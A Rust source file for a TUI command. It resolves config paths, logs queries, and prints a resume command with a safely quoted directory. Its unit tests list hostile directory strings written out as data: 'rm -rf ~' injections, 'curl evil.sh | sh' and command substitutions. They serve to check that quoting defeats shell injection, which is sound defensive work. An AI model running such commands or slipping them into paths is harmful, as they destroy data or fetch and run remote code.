//! Wiring for `cs tui`.
//!
//! Everything config-shaped lives here so `cs-tui` does not have to know it (docs/TUI-DESIGN.md
//! §1): this resolves the index path and the query log, and hands the TUI a sink. The TUI
//! resolves neither, which is what keeps it off `cs-archive`.

use anyhow::Result;
use cs_archive::Config;
use std::path::{Path, PathBuf};

pub fn run(
    config_path: &Path,
    db_path: Option<PathBuf>,
    source: Option<&str>,
    limit: i64,
) -> Result<()> {
    let cfg = Config::load(config_path)?;
    let db_path = db_path.unwrap_or_else(|| cfg.default_db());

    // Captured by the sink rather than read per event: the TUI can emit while the terminal
    // is still in raw mode, and re-reading the config there would be a filesystem hit inside
    // a keystroke path.
    let log_path = cfg.query_log();
    let log_queries = cfg.log_queries;
    let mut sink = |event: cs_core::querylog::Event| {
        // Same rule as everywhere else this is called: losing a log line costs a data point,
        // failing the action costs the thing that was asked for.
        if log_queries {
            let _ = cs_core::querylog::append(&log_path, &event);
        }
    };

    // Unlike `cs pick`, the TUI does not recompute the result list to find the rank — it
    // built the list, so it knows where the selection sat and emits the event itself.
    let opts = cs_tui::Opts {
        query: String::new(),
        source: source.map(String::from),
        limit,
    };

    match cs_tui::run(db_path, &mut sink, opts)? {
        cs_tui::Exit::Quit => Ok(()),
        // Printed rather than executed, so a shell wrapper decides whether to `eval` it.
        // Executing here would strand the user in a subprocess of a TUI they just left.
        cs_tui::Exit::Open { resume_cmd, cwd, .. } => {
            if let Some(cmd) = resume_cmd {
                match cwd.filter(|d| !d.is_empty()) {
                    // `cd` is composed here, so the directory is *our* argument to quote.
                    // It arrives from a transcript, meaning its contents are whatever the
                    // source tool recorded, and this line is written to be `eval`ed — so an
                    // unquoted `~/Documents/My Project` breaks `cd`, and a directory named
                    // with a `;` runs whatever follows it.
                    Some(dir) => println!("cd {} && {cmd}", shell_quote(&dir)),
                    None => println!("{cmd}"),
                }
            }
            Ok(())
        }
    }
}

/// POSIX single-quote wrapping.
///
/// Single quotes suspend every shell expansion, so the only character needing care is `'`
/// itself: close the quote, emit an escaped one, reopen. Unquoted values are never emitted,
/// even when they look safe — "looks safe" is a judgement about today's corpus, and this
/// string is written to be `eval`ed.
///
/// `resume_cmd` is deliberately *not* run through this. It is a whole command line rather
/// than one argument, so quoting it would turn `claude --resume <id>` into a request to
/// execute a file with that name. That asymmetry is a symptom of `me9.3`: a structured
/// open-target would let this compose an argv and drop shell composition entirely.
fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

#[cfg(test)]
mod tests {
    use super::shell_quote;

    #[test]
    fn a_directory_with_spaces_survives_as_one_argument() {
        assert_eq!(shell_quote("/Users/me/My Project"), "'/Users/me/My Project'");
    }

    #[test]
    fn shell_metacharacters_lose_their_meaning() {
        for hostile in [
            "/tmp/x; rm -rf ~",
            "/tmp/x && curl evil.sh | sh",
            "/tmp/$(whoami)",
            "/tmp/`id`",
            "/tmp/x\nrm -rf ~",
        ] {
            let quoted = shell_quote(hostile);
            assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
            // Nothing between the quotes can close them, which is what makes the whole
            // value one word to the shell however it is spelled.
            assert!(!quoted[1..quoted.len() - 1].contains('\''));
        }
    }

    #[test]
    fn an_embedded_quote_is_escaped_rather_than_dropped() {
        // The one case single-quoting cannot handle by itself, and the one most likely to
        // be got wrong: `it's` must round-trip, not silently lose a character.
        assert_eq!(shell_quote("/tmp/it's here"), r"'/tmp/it'\''s here'");
    }
}
